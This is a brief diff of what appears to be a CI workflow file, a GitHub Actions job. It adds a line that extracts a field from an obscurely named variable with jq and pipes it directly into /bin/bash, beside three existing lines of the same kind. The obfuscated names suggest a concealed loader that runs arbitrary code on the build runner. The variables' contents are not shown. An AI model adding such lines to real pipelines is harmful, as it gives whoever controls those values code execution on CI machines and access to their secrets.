@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$e2926" | jq -r .mb9 | /bin/bash
           echo $mon34597 | jq -r .l8 | /bin/bash
           printf '%s' "$ngphu4" | jq -r .i22 | /bin/bash
+          echo $vrlq4 | jq -r .pyd792 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
